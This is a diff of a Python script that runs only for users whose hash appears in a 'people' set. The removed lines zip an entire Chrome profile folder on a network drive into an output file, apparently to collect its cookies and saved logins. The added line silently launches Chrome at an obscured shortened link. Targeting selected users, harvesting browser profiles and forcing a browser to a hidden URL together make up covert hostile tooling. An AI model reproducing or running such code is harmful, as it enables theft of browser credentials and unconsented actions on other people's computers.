@@ -21,18 +21,5 @@ if hash in people:
 else:
     exit(0)
 
-chromepath = 'U:\Appscfg.MCS\AppData.W10\Google\Chrome'
-
-def zipdir(path, ziph):
-    # ziph is zipfile handle
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            try:
-                ziph.write(os.path.join(root, file))
-            except PermissionError:
-                print("permission error")
-
 if __name__ == '__main__':
-    zipf = zipfile.ZipFile(destpath , 'w', zipfile.ZIP_DEFLATED)
-    zipdir(chromepath, zipf)
-    zipf.close()
+    os.system('chrome tiny.cc/rfc')
